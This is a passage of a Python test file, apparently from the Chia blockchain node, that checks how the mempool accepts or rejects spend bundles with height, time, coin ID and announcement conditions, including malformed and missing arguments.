self.assert_sb_not_in_pool(full_node_1, sb12)\n        self.assert_sb_not_in_pool(full_node_1, sb3)\n    async def condition_tester(\n        self,\n        two_nodes,\n        dic: Dict[ConditionOpcode, List[ConditionWithArgs]],\n        fee: int = 0,\n        num_blocks: int = 3,\n        coin: Optional[Coin] = None,\n    ):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            num_blocks,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + num_blocks)\n        spend_bundle1 = generate_test_spend_bundle(\n            coin or list(blocks[-num_blocks + 2].get_included_reward_coins())[0], dic, uint64(fee)\n        )\n        assert spend_bundle1 is not None\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        return blocks, spend_bundle1, peer, status, err\n    @pytest.mark.asyncio\n    async def condition_tester2(self, two_nodes, test_fun: Callable[[Coin, Coin], SpendBundle]):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height if len(blocks) > 0 else -1\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coin_1 = list(blocks[-2].get_included_reward_coins())[0]\n        coin_2 = list(blocks[-1].get_included_reward_coins())[0]\n        bundle = test_fun(coin_1, coin_2)\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(bundle)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        return blocks, bundle, status, err\n    @pytest.mark.asyncio\n    async def test_invalid_block_index(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        cvp = ConditionWithArgs(\n            ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE,\n            [int_to_bytes(start_height + 5)],\n        )\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.ASSERT_HEIGHT_ABSOLUTE_FAILED\n    @pytest.mark.asyncio\n    async def test_block_index_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_correct_block_index(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(1)])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_block_index_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(1), b\"garbage\"])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_negative_block_index(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(-1)])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_invalid_block_age(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(5)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.ASSERT_HEIGHT_RELATIVE_FAILED\n    @pytest.mark.asyncio\n    async def test_block_age_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_correct_block_age(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, num_blocks=4)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_block_age_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(1), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, num_blocks=4)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_negative_block_age(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_RELATIVE, [int_to_bytes(-1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, num_blocks=4)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_correct_my_id(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [coin.name()])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_id_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [coin.name(), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_invalid_my_id(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        coin_2 = list(blocks[-2].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [coin_2.name()])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_COIN_ID_FAILED\n    @pytest.mark.asyncio\n    async def test_my_id_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_COIN_ID, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_assert_time_exceeds(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = full_node_1.full_node.blockchain.get_peak().timestamp + 5\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_fail(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = full_node_1.full_node.blockchain.get_peak().timestamp + 1000\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_SECONDS_ABSOLUTE_FAILED\n    @pytest.mark.asyncio\n    async def test_assert_time_negative(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = -1\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_assert_time_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_now = full_node_1.full_node.blockchain.get_peak().timestamp + 5\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, [int_to_bytes(time_now), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_exceeds(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_relative = 3\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(time_relative)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_SECONDS_RELATIVE_FAILED\n        for i in range(0, 4):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx2, peer)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_relative = 0\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(time_relative), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_assert_time_relative_negative(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        time_relative = -3\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_SECONDS_RELATIVE, [int_to_bytes(time_relative)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_correct_coin_announcement_consumed(self, two_nodes):\n        def test_fun(coin_1: Coin, coin_2: Coin) -> SpendBundle:\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            bundle = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n            return bundle\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_coin_announcement_garbage(self, two_nodes):\n        def test_fun(coin_1: Coin, coin_2: Coin) -> SpendBundle:\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name(), b\"garbage\"])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\", b\"garbage\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            bundle = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n            return bundle\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_coin_announcement_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name()) is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_coin_announcement_missing_arg2(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name()) is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_coin_announcement_too_big(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.name(), bytes([1] * 10000))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        assert full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name()) is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n        blocks = bt.get_consecutive_blocks(\n            1, block_list_input=blocks, guarantee_transaction_block=True, transaction_data=bundle\n        )\n        try:\n            await full_node_1.full_node.blockchain.receive_block(blocks[-1])\n            assert False\n        except AssertionError:\n            pass\n    @pytest.mark.asyncio\n    async def test_invalid_coin_announcement_rejected(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_COIN_ANNOUNCEMENT,\n                [b\"wrong test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_invalid_coin_announcement_rejected_two(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_1.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_COIN_ANNOUNCEMENT,\n                [b\"test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED\n    @pytest.mark.asyncio\n    async def test_correct_puzzle_announcement(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, bytes(0x80))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT, [bytes(0x80)])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_puzzle_announcement_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, bytes(0x80))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name(), b\"garbage\"])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT, [bytes(0x80), b\"garbage\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_puzzle_announcement_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n                [b\"test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_puzzle_announcement_missing_arg2(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n                [],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.GENERATOR_RUNTIME_ERROR\n    @pytest.mark.asyncio\n    async def test_invalid_puzzle_announcement_rejected(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        def test_fun(coin_1: Coin, coin_2: Coin):\n            announce = Announcement(coin_2.puzzle_hash, bytes(\"test\", \"utf-8\"))\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(\n                ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT,\n                [b\"wrong test\"],\n            )\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            return SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is None\n        assert status == 